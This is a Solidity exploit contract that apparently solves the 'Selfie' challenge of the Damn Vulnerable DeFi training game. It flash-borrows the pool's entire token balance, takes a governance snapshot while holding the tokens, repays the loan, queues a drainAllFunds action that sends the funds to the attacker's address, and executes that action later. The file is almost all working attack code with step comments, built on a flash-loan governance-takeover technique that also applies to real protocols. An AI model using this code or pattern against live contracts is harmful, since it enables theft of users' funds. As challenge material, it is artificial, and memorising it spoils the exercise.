// call flashLoan() from selfiepool
// receive the loan with fallback()
// call snapshot()
// call governance quee , drainallfunds()
// governance execute

import "../Contracts/selfie/SelfiePool.sol";
import "../Contracts/selfie/SimpleGovernance.sol";
import "../Contracts/DamnValuableTokenSnapshot.sol";

contract SelfieAttack {
    SelfiePool flashLoanPool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    address payable owner;

    uint256 public actionId;

    constructor(
        address _flashLoanPool,
        address _governance,
        address _token,
        address payable _owner
    ) {
        flashLoanPool = SelfiePool(_flashLoanPool);
        governance = SimpleGovernance(_governance);
        owner = _owner;
        token = DamnValuableTokenSnapshot(_token);
    }

    function attack() external {
        // we need to call flashLoan() for tokens

        uint256 amount = flashLoanPool.token().balanceOf(
            address(flashLoanPool)
        );

        flashLoanPool.flashLoan(amount);
    }

    fallback() external {
        // receive tokens with fallback()
        token.snapshot();
        token.transfer(address(flashLoanPool), token.balanceOf(address(this)));

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        // que action for drainAllFunds()

        actionId = governance.queueAction(address(flashLoanPool), data, 0);
    }

    // after time passed , we can call executeAction()
    function executeAttack() external {
        governance.executeAction(actionId);
    }
}
